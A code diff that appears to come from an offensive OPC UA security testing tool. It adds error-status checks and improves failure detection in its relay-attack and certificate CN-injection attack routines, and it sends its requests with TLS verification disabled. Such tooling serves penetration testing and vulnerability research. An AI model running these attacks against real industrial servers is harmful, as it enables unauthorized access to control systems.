@@ -210,6 +210,10 @@ def authenticated_opn(sock : socket, endpoint : endpointDescription.Type, client
       crypto=deriveKeyMaterial(sp, client_nonce, resp.serverNonce)
     )
 
+# In case a response object has a header. Check it for error codes.
+def check_status(response : NamedTuple):
+  if hasattr(response, 'responseHeader') and response.responseHeader.serviceResult & 0x80000000:
+    raise ServerError(response.responseHeader.serviceResult, f'Bad status code.')
 
 # Exchange a conversation message, once the channel has been established by the OPN exchange.
 def session_exchange(channel : ChannelState, 
@@ -264,6 +268,7 @@ def session_exchange(channel : ChannelState,
     
   # Parse the response.
   resp, _ = respfield.from_bytes(respbytes)
+  check_status(resp)
   return resp
   
 # OPC exchange over HTTPS.
@@ -283,7 +288,9 @@ def https_exchange(
     url = url[4:]
   reqbody = reqfield.to_bytes(reqfield.create(**req_data))
   http_resp = requests.post(url, verify=False, headers=headers, data=reqbody)
-  return respfield.from_bytes(http_resp.content)[0]
+  resp = respfield.from_bytes(http_resp.content)[0]
+  check_status(resp)
+  return resp
 
 # Picks either session_exchange or https_exchanged based on channel type.
 def generic_exchange(
@@ -353,7 +360,7 @@ def execute_relay_attack(
     createresp2 = csr(imp_chan, login_endpoint, imp_endpoint, createresp1.serverNonce)
     
     if createresp2.serverSignature.signature is None:
-      raise AttackNotPossible('Server did not sign nonce. An OPN attack may be needed first.')
+      raise AttackNotPossible('Server did not sign nonce. Perhaps certificate was rejected, or an OPN attack may be needed first.')
     
     # Make a token with an anonymous or certificate-based user identity policy.
     anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
@@ -1180,7 +1187,11 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
         requestedSessionTimeout=600000,
         maxResponseMessageSize=2**24,
       )
-      log_success('CreateSessionRequest with certificate accepted.')
+      if not createreply.serverNonce and ep.securityPolicyUri != SecurityPolicy.NONE:
+        log('Server did not sign nonce even though security policy is not none. Assuming this indicates authentication failure.')
+        return None
+        
+      log_success('CreateSessionRequest with certificate accepted.')      
       anon_policies = [p for p in ep.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
       if anon_policies:
         log('Trying to activate session.')
